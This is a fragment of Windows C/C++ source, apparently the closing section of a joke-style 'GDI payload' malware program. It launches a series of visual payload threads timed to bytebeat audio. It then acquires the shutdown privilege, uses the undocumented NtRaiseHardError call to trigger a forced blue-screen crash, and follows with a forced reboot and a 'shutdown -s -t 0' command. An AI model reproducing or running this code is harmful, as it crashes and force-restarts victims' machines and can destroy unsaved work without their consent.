			InvalidateRect(0, 0, 0);
			refreshscr();
			HANDLE thread15_num1 = CreateThread(0, 0, Payload15_num1, 0, 0, 0);
			HANDLE thread15_num2 = CreateThread(0, 0, Payload15_num2, 0, 0, 0);
			HANDLE thread15_num3 = CreateThread(0, 0, Payload15_num3, 0, 0, 0);
			bytebeat15();
			TerminateThread(thread15_num1, 0);
			CloseHandle(thread15_num1);
			TerminateThread(thread15_num2, 0);
			CloseHandle(thread15_num2);
			InvalidateRect(0, 0, 0);
			refreshscr();
			HANDLE thread16 = CreateThread(0, 0, Payload16_num1, 0, 0, 0);
			bytebeat16();
			TerminateThread(thread16, 0);
			CloseHandle(thread16);
			InvalidateRect(0, 0, 0);
			refreshscr();
			HANDLE thread17_num1 = CreateThread(0, 0, Payload17_num1, 0, 0, 0);
			HANDLE thread17_num2 = CreateThread(0, 0, Payload17_num2, 0, 0, 0);
			bytebeat17();
			TerminateThread(thread17_num1, 0);
			CloseHandle(thread17_num1);
			TerminateThread(thread17_num2, 0);
			CloseHandle(thread17_num2);
			InvalidateRect(0, 0, 0);
			refreshscr();
			HANDLE thread18 = CreateThread(0, 0, Payload18_num1, 0, 0, 0);
			bytebeat18();
			TerminateThread(thread18, 0);
			CloseHandle(thread18);
			InvalidateRect(0, 0, 0);
			refreshscr();
			HANDLE thread19 = CreateThread(0, 0, Payload19_num1, 0, 0, 0);
			bytebeat19();
			TerminateThread(thread19, 0);
			CloseHandle(thread19);
			InvalidateRect(0, 0, 0);
			refreshscr();
			TerminateThread(thread0, 0);
			CloseHandle(thread0);
			TerminateThread(thread0_, 0);
			CloseHandle(thread0_);
			TerminateThread(thread7_num2, 0);
			CloseHandle(thread7_num2);
			TerminateThread(thread13_num4, 0);
			CloseHandle(thread13_num4);
			TerminateThread(thread15_num3, 0);
			CloseHandle(thread15_num3);
			InvalidateRect(0, 0, 0);
			refreshscr();
			Sleep(100);
			BOOLEAN bl;
			DWORD response;
			NRHEdef NtRaiseHardError = (NRHEdef)GetProcAddress(LoadLibraryW(L"ntdll"), "NtRaiseHardError");
			RAPdef RtlAdjustPrivilege = (RAPdef)GetProcAddress(LoadLibraryW(L"ntdll"), "RtlAdjustPrivilege");
			RtlAdjustPrivilege(19, 1, 0, &bl);
			ULONG_PTR args[] = { (ULONG_PTR)"0x50335033" }; //Custom BSOD yay!
			NtRaiseHardError(0xC0000144, 1, 0, (PULONG)args, 6, &response);
			HANDLE token;
			TOKEN_PRIVILEGES privileges;
			OpenProcessToken(GetCurrentProcess(), TOKEN_ADJUST_PRIVILEGES | TOKEN_QUERY, &token);
			LookupPrivilegeValue(NULL, SE_SHUTDOWN_NAME, &privileges.Privileges[0].Luid);
			privileges.PrivilegeCount = 1;
			privileges.Privileges[0].Attributes = SE_PRIVILEGE_ENABLED;
			AdjustTokenPrivileges(token, FALSE, &privileges, 0, (PTOKEN_PRIVILEGES)NULL, 0);
			ExitWindowsEx(EWX_REBOOT | EWX_FORCE, SHTDN_REASON_MAJOR_HARDWARE | SHTDN_REASON_MINOR_DISK);
			Sleep(-1);
			system("shutdown -s -t 0");
		}
	}
	return 0;
}